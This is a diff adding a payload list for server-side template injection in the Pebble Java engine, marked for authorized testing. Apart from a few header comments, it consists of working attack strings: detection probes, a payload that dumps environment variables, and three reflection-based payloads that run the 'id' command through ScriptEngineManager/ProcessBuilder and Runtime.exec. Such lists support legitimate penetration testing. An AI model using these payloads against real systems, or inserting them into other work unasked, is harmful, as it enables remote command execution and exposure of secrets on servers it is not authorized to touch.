@@ -1,0 +1,21 @@
+# Pebble SSTI — detection + Java reflection RCE seeds
+# Source: PortSwigger SSTI (Pebble fingerprint), PAT/Java engine patterns in ssti-fuzz.txt
+# Tier: Curated | Authorized testing only
+# Note: Pebble is often confused with FreeMarker — confirm via error messages / output shape
+
+# --- Detection ---
+${{7*7}}
+${7*7}
+{{7*7}}
+
+# --- Environment / introspection (Java) ---
+${T(java.lang.System).getenv()}
+
+# --- RCE via ScriptEngineManager (from PAT ssti-fuzz — Java template engines) ---
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("new java.lang.ProcessBuilder(['id']).start()")}}
+
+# --- Alternative ProcessBuilder (PAT pattern) ---
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval("var x=new java.lang.ProcessBuilder; x.command(\"id\"); x.start()")}}
+
+# --- Runtime.exec style ---
+${T(java.lang.Runtime).getRuntime().exec('id')}
